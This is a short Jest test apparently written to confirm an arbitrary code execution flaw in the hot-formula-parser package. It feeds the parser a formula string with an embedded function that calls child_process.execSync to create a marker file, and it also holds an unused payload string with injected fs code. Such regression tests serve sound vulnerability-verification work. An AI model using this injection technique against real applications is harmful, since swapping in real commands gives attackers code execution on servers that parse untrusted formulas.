test("Arbitrary code execution in hot-formula-parser", () => {
  expect.assertions(2);
  const fs = require("fs");
  const FormulaParser = require("hot-formula-parser").Parser;
  const path = "./hot-formula-parser";
  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let parser = new FormulaParser();
    parser.parse(
      "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])"
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
